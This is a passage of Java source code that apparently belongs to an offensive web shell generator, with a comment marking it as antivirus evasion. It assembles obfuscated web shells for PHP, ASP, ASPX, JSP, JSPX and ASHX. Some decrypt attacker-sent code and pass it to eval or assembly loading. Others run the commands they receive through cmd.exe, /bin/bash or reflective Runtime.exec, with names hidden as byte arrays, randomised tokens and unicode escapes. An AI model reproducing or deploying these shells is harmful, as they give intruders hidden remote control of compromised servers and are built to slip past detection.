                    webShellCode = "<?php @error_reporting(0);session_start();${{0}} = \"{{aesKey}}\";$_SESSION['k'] = ${{0}};${{1}} = 'file'.'_get'.'_contents';${{2}} = '|||||||||||' ^ chr(12).chr(20).chr(12).chr(70).chr(83).chr(83).chr(21).chr(18).chr(12).chr(9).chr(8);${{3}} = ${{1}}(${{2}});if (!extension_loaded('openssl')) {${{4}} = preg_filter('/\\s+/', '', 'base 64 _ deco de');${{3}} = ${{4}}(${{3}}.\"\");for ($i = 0; $i < strlen(${{3}}); $i++) {${{5}} = ${{0}}[$i + 1 & 15];${{3}}[$i] = ${{3}}[$i] ^ ${{5}};}} else {${{3}} = openssl_decrypt(${{3}}, \"AES128\", ${{0}});}${{6}} = explode('|', ${{3}});$func = ${{6}}[0];${{7}} = ${{6}}[1];class {{8}} {public function __invoke(${{2}}) {@eval(\"/*{{9}}*/\".${{2}}.\"\");}}@call_user_func/*{{10}}*/(new {{8}}(), ${{7}}); ?>";

                    webShellCode = webShellCode.replace("{{aesKey}}", aesKey);

                    webShellCode = strUtils.replaceFlags(webShellCode, randomString);

                }

            }
            else if (scriptMethod.equals("asp")){

                if (Arrays.asList(enMethod).containsAll(Arrays.asList("default"))){

                    webShellCode = "<% \n<!-- \nResponse.CharSet = \"UTF-8\" \n{{0}}=\"{{aesKey}}\"  \nSession(\"k\")={{0}} \n{{1}}=Request.TotalBytes \n{{2}}=Request.BinaryRead({{1}}) \nFor i=1 To {{1}} \n{{3}}=ascb(midb({{2}},i,1)) Xor Asc(Mid({{0}},(i and 15)+1,1))  \n{{4}}={{4}}&Chr({{3}}) \nNext \nexecute({{4}})\n-->\n%>";

                    webShellCode = webShellCode.replace("{{aesKey}}", aesKey);

                    webShellCode = strUtils.replaceFlags(webShellCode, randomString);

                }

            }
            else if (scriptMethod.equals("aspx")){

                if (Arrays.asList(enMethod).containsAll(Arrays.asList("default"))){

                    webShellCode = "<%try{Session.@Add(\"key\",\"{{aesKey}}\"); byte[] {{0}} = Encoding.Default.GetBytes(Session[0] + \"\"),{{1}} = Request.BinaryRead(Request.ContentLength);byte[] {{2}} = new @System.@Security.@Cryptography.@RijndaelManaged()./*{{3}}*/@CreateDecryptor({{0}}, {{0}})/*{{4}}*/.@TransformFinalBlock({{1}}, 0, {{1}}.Length);@System.@Reflection.@Assembly.@Load({{2}})/*{{5}}*/.@CreateInstance(\"U\")/**/.Equals(/*{{6}}*/this)/*{{7}}*/;}catch(System.Exception){}%><%@ Page Language=\"CS\" %>\n";

                    webShellCode = webShellCode.replace("{{aesKey}}", aesKey);

                    webShellCode = strUtils.replaceFlags(webShellCode, randomString);

                }

            }

        }

        // Cmd免杀
        else if (webShell_Manager.equals("Cmd")){

            if (scriptMethod.equals("jsp")){

                if (Arrays.asList(enMethod).containsAll(Arrays.asList("default"))){

                    webShellCode = "<%  String {{0}} = request.getParameter(\"{{pass}}\");ProcessBuilder {{1}};if(String.valueOf(java.io.File.separatorChar).equals(\"\\\\\")){{{1}} = new ProcessBuilder(new /*{{2}}*/String(new byte[]{99, 109, 100}), new String(new byte[]{47, 67}), {{0}});}else{{{1}} = new ProcessBuilder/*{{3}}*/(new/*{{4}}*/String(new byte[]{47, 98, 105, 110, 47, 98, 97, 115, 104}), new String(new byte[]{45, 99}), {{0}});}if ({{0}} != null) {Process {{5}} = {{1}}.start();java.util.Scanner {{6}} = new java.util.Scanner({{5}}.getInputStream()).useDelimiter(\"\\\\A\");String {{7}}=\"\";{{7}} = {{6}}.hasNext() ? {{6}}.next() : {{7}};{{6}}.close();out.print({{7}});}else {/*response.sendError(404);*/} %>";

                    webShellCode = webShellCode.replace("{{pass}}", pass);

                    webShellCode = strUtils.replaceFlags(webShellCode, randomString);

                }
                else if (Arrays.asList(enMethod).containsAll(Arrays.asList("reflect"))){

                    webShellCode = "<% String {{0}} = request.getParameter(\"{{pass}}\"); if({{0}}!=null){Class<?> {{1}} = Class.forName(new String(new byte[]{106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101}));java.lang.reflect.Method {{2}} = {{1}}.getMethod(new String(new byte[]{101, 120, 101, 99}), String.class);Object {{3}} = {{2}}.invoke( {{1}}.getMethod(new String(new byte[]{103, 101, 116, 82, 117, 110, 116, 105, 109, 101})).invoke(null, new Object[]{}), new Object[]{{{0}}});java.lang.reflect.Method {{4}} = {{3}}.getClass().getMethod(new String(new byte[]{103, 101, 116, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109}));{{4}}.setAccessible(true);java.util.Scanner {{5}} = new java.util.Scanner((java.io.InputStream) {{4}}.invoke({{3}}, new Object[]{})).useDelimiter(\"\\\\A\");String {{6}} = {{5}}.hasNext() ? {{5}}.next() : \"\";out.print(\"<pre>\");out.print({{6}});out.print(\"</pre>\");}else{/*response.sendError(404);*/} %>";

                    webShellCode = webShellCode.replace("{{pass}}", pass);

                    webShellCode = strUtils.replaceFlags(webShellCode, randomString);

                }

                if (Arrays.asList(enMethod).containsAll(Arrays.asList("unicode"))){

                    String regex = "<%\\s*(.*?)\\s*%>";
                    Pattern pattern = Pattern.compile(regex);
                    Matcher matcher = pattern.matcher(webShellCode);
                    while (matcher.find()) {

                        String substring = matcher.group(1);
                        String unicodeEncoded = "//\\uuu000a" + strUtils.toUnicode(substring, Boolean.TRUE);
                        webShellCode = webShellCode.replace(substring, unicodeEncoded);

                    }

                }

            }
            else if (scriptMethod.equals("jspx")){

                if (Arrays.asList(enMethod).containsAll(Arrays.asList("default"))){

                    webShellCode = "<hi xmlns:hi=\"http://java.sun.com/JSP/Page\">\n<hi:scriptlet>\nString {{0}} = request.getParameter(\"{{pass}}\"); if({{0}}!=null){Class {{1}} = Class.forName(new String(new byte[]{106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101}));java.lang.reflect.Method {{2}} = {{1}}.getMethod(new String(new byte[]{101, 120, 101, 99}), String.class);Object {{3}} = {{2}}.invoke( {{1}}.getMethod(new String(new byte[]{103, 101, 116, 82, 117, 110, 116, 105, 109, 101})).invoke(null, new Object[]{}), new Object[]{{{0}}});java.lang.reflect.Method {{4}} = {{3}}.getClass().getMethod(new String(new byte[]{103, 101, 116, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109}));{{4}}.setAccessible(true);java.util.Scanner {{5}} = new java.util.Scanner((java.io.InputStream) {{4}}.invoke({{3}}, new Object[]{})).useDelimiter(\"\\\\A\");String {{6}} = {{5}}.hasNext() ? {{5}}.next() : \"\";out.print({{6}});}else{/*response.sendError(404);*/}\n</hi:scriptlet>\n</hi>";

                    webShellCode = webShellCode.replace("{{pass}}", pass);

                    webShellCode = strUtils.replaceFlags(webShellCode, randomString);

                }
                else if (Arrays.asList(enMethod).containsAll(Arrays.asList("reflect"))){

                    webShellCode = "<hi xmlns:hi=\"http://java.sun.com/JSP/Page\">\n<hi:scriptlet>\nString {{0}} = request.getParameter(\"{{pass}}\"); if({{0}}!=null){Class {{1}} = Class.forName(new String(new byte[]{106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101}));java.lang.reflect.Method {{2}} = {{1}}.getMethod(new String(new byte[]{101, 120, 101, 99}), String.class);Object {{3}} = {{2}}.invoke( {{1}}.getMethod(new String(new byte[]{103, 101, 116, 82, 117, 110, 116, 105, 109, 101})).invoke(null, new Object[]{}), new Object[]{{{0}}});java.lang.reflect.Method {{4}} = {{3}}.getClass().getMethod(new String(new byte[]{103, 101, 116, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109}));{{4}}.setAccessible(true);java.util.Scanner {{5}} = new java.util.Scanner((java.io.InputStream) {{4}}.invoke({{3}}, new Object[]{})).useDelimiter(\"\\\\A\");String {{6}} = {{5}}.hasNext() ? {{5}}.next() : \"\";out.print({{6}});}else{/*response.sendError(404);*/}\n</hi:scriptlet>\n</hi>";

                    webShellCode = webShellCode.replace("{{pass}}", pass);

                    webShellCode = strUtils.replaceFlags(webShellCode, randomString);

                }

                if (Arrays.asList(enMethod).containsAll(Arrays.asList("unicode"))){

                    String regex = "<hi:scriptlet>\\n(.*?)</hi:scriptlet>";
                    Pattern pattern = Pattern.compile(regex, Pattern.DOTALL);// Pattern.DOTALL支持换行
                    Matcher matcher = pattern.matcher(webShellCode);
                    while (matcher.find()) {

                        String substring = matcher.group(1);
                        String unicodeEncoded = "//\\uuu000a" + strUtils.toUnicode(substring, Boolean.TRUE);
                        webShellCode = webShellCode.replace(substring, unicodeEncoded);

                    }

                }

            }
            else if (scriptMethod.equals("ashx")){

                if (Arrays.asList(enMethod).containsAll(Arrays.asList("default"))){

                    webShellCode = "<%@ WebHandler Language=\"CS\" Class=\"Handler3\" %>using System;using System.Collections.Generic; using System.Diagnostics;using System.Web;public class Handler3 : IHttpHandler { public void ProcessRequest (HttpContext context) { string {{0}} = context.Request[\"{{pass}}\"];System.Diagnostics.Process {{1}} = new System.Diagnostics.Process();/*{{2}}*/{{1}}.StartInfo./*{{3}}*/FileName = \"cmd.exe\";\t/*{{4}}*/{{1}}.StartInfo.UseShellExecute = false;/*{{5}}*/{{1}}.StartInfo.RedirectStandardInput = true;{{1}}.StartInfo.RedirectStandardOutput = true;{{1}}.StartInfo.RedirectStandardError = true;{{1}}.StartInfo.CreateNoWindow = true;{{1}}.Start();{{1}}.StandardInput.WriteLine({{0}});{{1}}.StandardInput.Close();context.Response.Write({{1}}.StandardOutput.ReadToEnd());context.Response.End();}public bool IsReusable { get { return false;}}}";

                    webShellCode = webShellCode.replace("{{pass}}", pass);

                    webShellCode = strUtils.replaceFlags(webShellCode, randomString);

                }

            }

        }


        return  webShellCode;
    }

}
